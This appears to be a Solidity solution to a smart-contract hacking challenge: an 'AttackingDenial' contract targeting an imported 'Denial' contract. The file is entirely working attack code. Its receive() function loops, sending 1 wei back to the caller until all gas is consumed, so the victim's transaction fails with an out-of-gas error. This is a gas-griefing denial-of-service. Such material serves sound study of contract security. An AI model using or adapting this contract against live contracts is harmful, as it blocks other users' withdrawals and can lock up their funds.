// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        // This contract will receive 1% of the victim's balance.
        // Take the remaining gas and treat is as a quantity of wei,
        // then send these wei back to the sender, one by one.
        // This will cause an "out of gas" exception, aborting the transaction.
        uint gas = gasleft();
        for (uint256 i = 0; i <= gas; i++) {
            msg.sender.call{value: 1}("");
        }
    }
}
